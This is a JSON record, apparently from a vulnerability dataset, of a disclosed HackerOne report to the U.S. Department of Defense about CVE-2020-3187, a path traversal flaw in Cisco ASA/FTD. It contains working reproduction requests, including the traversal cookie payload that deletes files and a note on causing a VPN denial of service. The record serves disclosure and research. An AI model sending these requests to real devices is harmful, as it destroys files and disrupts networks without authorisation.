@@ -1,0 +1,38 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "emad777 ",
+  "title": "Unauthenticated Arbitrary File Deletion \"CVE-2020-3187\" in \u2588\u2588\u2588\u2588\u2588",
+  "content": "\nSummary:\nA vulnerability in the interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files.\nDescription:\nVulnerable host:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nAn exploit could allow the attacker to view or delete arbitrary files on the system.\nStep-by-step Reproduction Instructions\n1.Identifying vulnerable host by send request to /+CSCOE+/session_password.html.\ncurl -skiL \"\u2588\u2588\u2588/+CSCOE+/session_password.html\"\nCode 387 Bytes\n1GET /+CSCOE+/session_password.html HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n5Accept-Language: en-US,ar;q=0.7,en;q=0.3\n6Accept-Encoding: gzip, deflate\n7Connection: close\n8Cookie: webvpnlogin=1; webvpnLang=en\n9Upgrade-Insecure-Requests: 1\nIf the target is vulnerable, the response header will display webvpn header, like:\nThe request gave me the following response\nCode 194 Bytes\n1HTTP/1.1 200 OK\n2Content-Type: text/plain\n3Content-Length: 0\n4Cache-Control: no-cache\n5Pragma: no-cache\n6Connection: Keep-Alive\n7Date: Wed, 04 Nov 2020 21:40:44 GMT\n8X-Frame-Options: SAMEORIGIN\n9webvpn:\n2.Perform exploits to delete files by adding token in cookie header request.\nFor example, I wanted to delete this (\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOU+/csco_logo.gif) file.\nThat did not work because sometimes logo.gif/png has permission issues so try this \"\u2588\u2588\u2588\u2588\u2588/+CSCOE+/blank.html\"\nYou can also delete the file \"/+CSCOE+/blank.html\" (an empty HTML file), as it might be a problem with the permission of the custom logo file sometimes logo.gif has permission issue so we might not be able to delete but we can delete other files\nRequest:\nCode 357 Bytes\n1Host: \u2588\u2588\u2588\u2588\u2588\u2588\n2User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\n3Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n4Accept-Language: en-US,ar;q=0.7,en;q=0.3\n5Accept-Encoding: gzip, deflate\n6Connection: close\n7Cookie: webvpnlogin=1; webvpnLang=en\n8Upgrade-Insecure-Requests: 1```\n9\n10Response:\n11\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:54:48 GMT\nX-Frame-Options: SAMEORIGIN\nContent-Length: 13\nCode 17 Bytes\n1<HTML></HTML>\n2```\n3. So I exploited the CVE and deleted the blank file. As following:\nRequest:\nCode 131 Bytes\n1GET /+CSCOE+/session_password.html HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: token=../+CSCOE+/blank.html\n4User-Agent: curl/7.47.0\n5Accept: */*\nResponse:\nCode 194 Bytes\n1HTTP/1.1 200 OK\n2Content-Type: text/plain\n3Content-Length: 0\n4Cache-Control: no-cache\n5Pragma: no-cache\n6Connection: Keep-Alive\n7Date: Wed, 04 Nov 2020 21:55:02 GMT\n8X-Frame-Options: SAMEORIGIN\n9webvpn:\nFile deleted successfully:\ncurl -Ik \u2588\u2588\u2588\u2588/+CSCOE+/blank.html\nCode 161 Bytes\n1HTTP/1.1 404 Not Found\n2Cache-Control: no-cache\n3Pragma: no-cache\n4Connection: Close\n5Date: Wed, 04 Nov 2020 21:55:08 GMT\n6X-Frame-Options: SAMEORIGIN\n7\n8File not found\nWarning : This can lead to a denial of service (DOS) on the VPN by deleting the lua source code files from the file system, which will break the WebVPN interface until the device is rebooted.\nSuggested Mitigation/Remediation Actions\nUpgrade the ASA software version per the referenced advisory. This advisory is available at the following link:\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43\nImpact\nHigh - This vulnerability allows the attacker to delete files within the web services file system.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1606172460,
+  "report_url": "https://hackerone.com/reports/1026265",
+  "vuln_category": "WEB_APP",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "steps": [
+    [
+      1,
+      "Identify a vulnerable host by sending a request to /+CSCOE+/session_password.html and checking for the presence of the 'webvpn' header in the response."
+    ],
+    [
+      2,
+      "Exploit the vulnerability by sending a crafted request with a malicious 'token' cookie to delete arbitrary files, such as /+CSCOE+/blank.html."
+    ]
+  ],
+  "vuln_description": "An unauthenticated directory traversal vulnerability in Cisco ASA and FTD software allows remote attackers to delete arbitrary files on the system, potentially leading to a denial of service (DoS) by breaking the WebVPN interface.",
+  "reason": "The vulnerability involves a straightforward directory traversal attack with minimal components and no complex interactions or state manipulation. The attack is based on a known pattern (path traversal) and does not require novel logic.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
